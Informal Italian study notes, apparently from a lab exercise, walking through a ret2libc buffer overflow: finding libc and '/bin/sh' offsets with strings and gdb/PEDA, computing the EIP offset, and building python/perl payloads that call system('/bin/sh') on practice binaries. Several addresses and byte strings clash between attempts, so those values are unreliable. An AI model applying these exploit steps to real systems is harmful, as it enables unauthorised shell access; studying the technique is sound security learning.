Cosa fare:

Prima di tutto ldd bin/binario per vedere path di libc.so.6
poi : strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep -i '/bin/sh' (ce lo salviamo come 0x..)
poi: gdb -q bin/binario
gdb break main
gdb r
gdb vmmap
prendiamoci lo start di libc.so

poi: sommiamo lo starti di libc.so e la stringa /bin/sh
printf "0x%x\n" $((0xf7deb000 + 0x16a23e))
vediamo se l'abbiamo copiato bene:
gdb -q bin/binario
gdb break main
gdb r
gdb x/s 0x... se esce /bin/sh è ok
dopodichè gdb p system
gdb p exit
gdb q
poi reverse di system address : raddr -a 0xf7e2c540
reverse di /bin/sh (quello sommato) : raddr -a 0xf7e2c540
reverse di return address (exit) : raddr -a 0xf7e2c540
dopodichè:
python -c 'print "A"*256 + "B"*4 + "\x00\x3c\xdc\xf7" + "\xe0\x0b\xe0\xf7" + "\xaa\xda\xf4\xf7"' | ./ret2libc
dove 256 è la grandezza del buffer, il primo parametro è system address, exit address, bin/sh address


0x17eaaa bin/sh

0xf7dcf000 lib ok

printf "0x%x\n" $((0xf7dcc000 + 0x17eaaa))
0xf7f4aaaa \xaa\xaa\xf4\xf7

0xf7e0dc00 system \x00\xdc\xe0\xf7

0xf7e00be0 exit \xe0\x0b\xe0\xf7

python -c 'print "A"*256 + "B"*4 + "\x00\xdc\xe0\xf7" + "\xe0\x0b\xe0\xf7" + "\xaa\xda\xf4\xf7"' | ./sof



NOTA:
fai gdb filepattern create 300 payload , run $(cat payload), r, Ti prendi il valore esadecimale dell'EIP e poi fai, pattern offset 0xVALORE_EIP, e ti dà l'offset che è il valore per cui devi moltiplicare A



riproviamo:

0xf7dcf000

somma 0xf7f4daaa /bin/sh \xaa\xda\xf4\xf7

system 0xf7e0dc00 \x00\xdc\xe0\xf7
exit 0xf7e00be0 \xe0\x0b\xe0\xf7


sof $(perl -e 'print "A" x 260 . "\x00\xdc\xe0\xf7" . "\xe0\x0b\xe0\xf7" . "\xaa\xda\xf4\xf7"')


./sof $(perl -e 'print "A" x 264 . "\x00\xdc\xe0\xf7" . "\xe0\x0b\xe0\xf7" . "\xaa\xda\xf4\xf7"')


PEDA:
gdb binario
gdb pattern create 300 payload
gdb run $(cat payload)
pattern offset 0x64254148



system 0xf7e0dc00 \x00\xdc\xe0\xf7
exit 0xf7e00be0 \xe0\x0b\xe0\xf7
binsh 0x17eaaa

0xf7dcc000

printf "0x%x\n" $((0xf7dcc000 + 0x17eaaa)) = 0xf7f4aaaa \xaa\xaa\xf4\xf7


./sof (python -c 'print "A"*264+"\x00\xdc\xe0\xf7"+"\xe0\x0b\xe0\xf7"+"\xaa\xaa\xf4\xf7"')

